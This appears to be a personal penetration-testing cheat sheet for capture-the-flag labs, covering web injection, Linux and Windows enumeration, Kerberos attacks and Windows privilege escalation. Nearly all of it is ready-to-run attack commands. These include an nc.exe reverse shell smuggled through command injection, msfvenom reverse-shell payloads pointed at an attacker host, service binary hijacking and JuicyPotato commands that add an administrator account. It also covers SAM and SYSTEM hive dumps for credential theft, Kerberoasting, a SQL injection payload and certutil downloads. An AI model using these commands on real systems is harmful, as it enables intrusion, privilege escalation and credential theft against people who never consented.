# Web Hacking

## SSL Certificates

```shell
# Inspect SSL certificates
openssl s_client -connect 10.10.10.250:443
````

## OWASP Top 10

## SQL Injection

### PostgreSQL Injection

```command
'; select pg_sleep(10);-- -
```

## Command Injection

### Ask Jeeves

```powershell
# Shared resource
println "\\\\10.10.10.10\\smbFolder\\nc.exe -e 10.10.10.10 443".execute().text
```
------------------------------------------------------------------------------------------------------
# Linux Section

## Enumeration

```shell
# System Enumeration
find / -name file 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```
------------------------------------------------------------------------------------------------------
# Windows Section

## Active Directory Enumeration

### SMBClient

```shell
smbclient -L 10.10.10.250 -N
```

### SMBMap

```shell
# Unauthenticated
smbmap -H 10.10.10.250 -u 'null'

# Authenticated to a share 
smbmap -H 10.10.10.250 -u
```

### RPCClient

```powershell
# Unauthenticated (Null Session)
rpcclient -U "" 10.10.10.250

# Authenticated
rpcclient -U "username%password" 10.10.10.250
enumdomusers
enumdomgroups
querygroupmem <rid>
queryuser <rid>
```

# Kerberos

## Enumerating valid users

#### [kerbrute](https://github.com/ropnop/kerbrute)

Find **valid** domain controller users

```powershell
kerbrute userenum --dc 10.10.10.250 -d domain.local users.list
```

Combinating with [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)

Find **ASREPRoast** users. Requires with **UF_DONT_REQUIRE_PREAUTH** attribute.

```powershell
GetNPUsers.py domain.local/ --no-pass -usersfile valid_users.list
```

Find **Kerberoasting** users. Requires users with **ServicePrincipalName** attribute.

Combinating with [GetUsersSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

```powershell
GetUsersSPNs.py 'domain.local/jan:password'
```

# Windows Privilege Escalation Techniques

## Windows Internal Enumeration

```powershell
# System Enumeration
systeminfo
windows version registry key print

# Network Enumeration
netstat -nat

# User Enumeration
whoami /priv, whoami /all
net user <user>

# Services Enumeration
services
```

## Abusing groups

### Server Operators
Create/Modify Services

```powershell
# MSFVenom Reverse Shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe

# Modiying binary
sc.exe config VMTools binpath="C:\Users\Janrdz\Desktop\shell.exe"
```
## Abusing Privileges

### SeImpersonatePrivilege
#### [JuicyPotato](https://github.com/k4sth4/Juicy-Potato)

```powershell
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user jan jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
```

### AlwaysInstallElevated

Create a payload.msi with MSFVenom (Reverse Shell)

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
```

### SeBackupPrivilege

Create a copy of SYSTEM and SAM dump with [secretsdump.py](https://github.com/fin3ss3g0d/secretsdump.py)

```powershell
PS C:\Temp> reg save HKLM\system system
PS C:\Temp> reg save HKLM\sam sam
```

------------------------------------------------------------------------------------------------------

# File Transfers

## Windows

```powershell
certutil.exe -f -urlcache -split http://10.10.10.10/winPease.exe winPease.exe
```

## Impackets

```command
impacket-smbserver smbFolder $(pwd) -smb2support
```

------------------------------------------------------------------------------------------------------

# Advance
 

------------------------------------------------------------------------------------------------------

# Extra

## Alternate Data Streams (Windows)

ADS (Alternate Data Stream): is the ability to branch data into existing files without changing or altering its functionality, size or display to file browsing utilities.

```command
dir /r /s
more < ads.txt
more < ads.txt:file.txt
```

## Change access control lists on files and folders

```powershell
icacls file.txt
```

## Separating characters with points

```shell
echo "characters" | iconv -t utf-16le | base64 -w 0; echo
```
